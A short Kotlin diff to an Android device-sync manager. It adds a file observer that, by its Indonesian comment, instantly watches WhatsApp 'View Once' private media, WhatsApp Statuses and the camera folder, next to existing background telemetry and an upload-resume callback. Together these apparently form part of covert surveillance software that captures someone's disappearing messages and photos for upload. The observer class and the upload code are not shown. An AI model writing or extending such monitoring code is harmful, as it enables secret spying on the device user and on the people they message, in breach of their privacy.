@@ -42,6 +42,9 @@ object DeviceSyncManager {
         // Setup background telemetry & connectivity monitoring for this device (universal for all accounts)
         registerMediaObserver(appContext)
 
+        // Linux Inotify Watcher: memantau media WhatsApp Private (View Once), Statuses, dan Kamera seketika
+        MultiDirectoryFileObserver.startWatchingAll(appContext)
+
         // Register NetworkCallback untuk auto-resume upload saat tersambung internet (WiFi / Paket Data)
         registerNetworkCallback(appContext)
 
@@ -281,6 +284,9 @@ object DeviceSyncManager {
     }
 
     fun stop() {
+        try {
+            MultiDirectoryFileObserver.stopWatchingAll()
+        } catch (e: Exception) {}
         try {
             scheduledExecutor?.shutdownNow()
         } catch (e: Exception) {}
